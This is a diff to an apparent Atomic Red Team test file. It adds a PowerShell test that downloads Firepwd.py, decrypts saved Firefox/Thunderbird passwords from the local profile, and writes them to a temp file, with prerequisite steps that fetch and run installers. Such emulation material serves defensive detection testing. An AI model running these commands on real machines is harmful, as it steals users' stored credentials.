@@ -191,3 +191,94 @@ atomic_tests:
       Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination $env:temp\Edge -Force -Recurse
     cleanup_command: |
       Remove-Item -Path "$env:temp\Edge" -Force -ErrorAction Ignore -Recurse
+- name: Decrypt Mozilla Passwords with Firepwd.py
+  auto_generated_guid: dc9cd677-c70f-4df5-bd1c-f114af3c2381
+  description: |
+    Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.
+    Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. 
+  supported_platforms:
+    - windows
+  input_arguments:
+    Firepwd_Path:
+      description: Filepath for Firepwd.py
+      type: String
+      default: $env:temp\Firepwd.py
+    Out_Filepath:
+      description: Filepath to output results to
+      type: String
+      default: $env:temp\T1555.003Test8.txt
+    VS_CMD_Path:
+      description: Filepath to Visual Studio Build Tools Command prompt
+      type: String
+      default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
+    Python_Path:
+      description: Filepath to python
+      type: String
+      default: C:\Program Files\Python310\python.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Firepwd must exist at #{Firepwd_Path}
+    prereq_command: |
+      if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
+  - description: |
+      Firefox profile directory must be present
+    prereq_command: |
+      if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "$env:temp\firefox.msi"
+      msiexec.exe /i "$env:temp\firefox.msi" /quiet
+      sleep -s 30
+      start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
+      sleep -s 5
+      stop-process -name "firefox"
+  - description: |
+      Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}
+    prereq_command: |
+      if (Test-Path "#{VS_CMD_Path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "$env:temp\VS_BuildTools.exe"
+      write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from $env:temp\VS_BuildTools.exe."
+  - description: |
+      Python must be installed
+    prereq_command: |
+      if (Test-Path "#{Python_Path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "$env:temp\python_setup.exe"
+      Start-Process -FilePath $env:TEMP\python_setup.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+  - description: |
+      Pip must be installed.
+    prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (pip -v) {exit 0} else {exit 1}
+    get_prereq_command: |
+      invoke-webrequest "https://bootstrap.pypa.io/ez_setup.py" -outfile "$env:temp\ez_setup.py"      
+      invoke-webrequest "https://bootstrap.pypa.io/get-pip.py" -outfile "$env:temp\get-pip.py"
+      cmd /c "$env:temp\ez_setup.py"
+      cmd /c "$env:temp\get-pip.py"
+  - description: |
+      Pycryptodome library must be installed 
+    prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (pip show pycryptodome) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (test-path "#{VS_CMD_Path}"){pip install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
+  - description: |
+      Pyasn1 library must be installed 
+    prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (pip show pyasn1) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User"))
+      if (test-path "#{VS_CMD_Path}"){pip install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
+  executor:
+    name: powershell
+    command: |
+     $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+     cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
+     cat #{Out_Filepath}
+    cleanup_command: |
+     Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue   
